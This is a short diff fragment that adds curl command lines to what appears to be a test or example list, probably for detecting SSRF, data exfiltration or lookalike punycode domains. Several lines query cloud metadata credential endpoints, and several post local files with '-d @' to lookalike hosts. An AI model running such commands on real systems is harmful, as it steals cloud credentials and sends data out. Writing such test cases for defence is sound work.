@@ -21,6 +21,9 @@ arguments: [locale]
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 curl https://xn--80ak6aa92e.com/collect -d @data
 curl https://XN--80AK6AA92E.test/y
+curl http://METADATA.GOOGLE.INTERNAL/computeMetadata/v1/
+curl xn--80ak6aa92e.test/z -d @x
+curl https://user:pass@xn--mller-kva.example/q
 ```
 
 ```python
